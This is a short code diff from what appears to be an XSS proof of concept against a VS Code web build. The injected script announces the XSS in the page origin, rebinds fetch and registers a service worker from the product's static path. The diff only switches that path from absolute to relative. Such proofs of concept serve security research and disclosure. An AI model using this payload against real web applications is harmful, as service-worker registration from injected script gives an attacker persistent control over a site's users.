@@ -1,7 +1,7 @@
 console.dir("Shirley: Hey sudi, I love you , here is your XSS in " + origin)
 globalThis.fetch = WorkerGlobalScope.prototype.fetch.bind(globalThis)
 
-const r_promise = navigator.serviceWorker.register("/stable-de65bfc9477f61bc22d0b1a23085d1f18bb25202/static/out/vs/base/worker/workerMain.js")
+const r_promise = navigator.serviceWorker.register("../../../../base/worker/workerMain.js")
 r_promise.then((registration) => {
     console.log("Registered worker");
     console.log(registration)
